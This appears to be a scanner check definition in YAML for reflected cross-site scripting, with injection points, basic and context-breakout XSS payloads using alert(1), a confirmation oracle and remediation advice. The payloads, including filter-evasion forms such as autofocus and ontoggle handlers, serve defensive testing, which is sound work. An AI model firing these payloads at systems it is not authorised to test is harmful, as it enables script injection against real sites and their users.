id: xss-reflected
name: Reflected Cross-Site Scripting (XSS)
family: xss
severity: high
cwe: CWE-79
owasp: WSTG-INPV-01
cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
inject_into: [query, body, json, path]
payloads:
  - "<script>alert(1)</script>"
  - "\"><svg onload=alert(1)>"          # attribute breakout -> new tag
  - "'-alert(1)-'"                        # JS string context breakout
  - "<img src=x onerror=alert(1)>"       # event-handler context
  - "javascript:alert(1)"                # href/src sink context
# Tried only when the planner marks xss a priority (e.g. a client-rendered SPA). More breakout contexts
# so a reflection that lands inside <script>/<title>/<textarea> or a quoted attribute still executes.
# The SAME context-aware reflected_xss oracle confirms each (fires only on an *executable* reflection).
intensive_payloads:
  - "</script><script>alert(1)</script>"     # break out of an existing inline <script> block
  - "</title><script>alert(1)</script>"      # break out of <title>
  - "</textarea><script>alert(1)</script>"   # break out of <textarea>
  - "<svg/onload=alert(1)>"                   # slash-delimited tag: no space for a space-filter to catch
  - "<body onload=alert(1)>"                  # body load handler
  - "<details open ontoggle=alert(1)>"        # auto-firing handler, no script tag
  - "\" autofocus onfocus=alert(1) x=\""      # attribute-context injection without breaking the tag
oracle:
  type: any_of
  checks:
    - type: reflected_xss   # context-aware: only fires on an *executable* reflection
confirm_reproducible: true
remediation: >-
  HTML-encode all user input before rendering it into HTML (contextual output
  encoding). Prefer a templating engine with autoescaping enabled, and add a
  Content-Security-Policy as defense in depth.
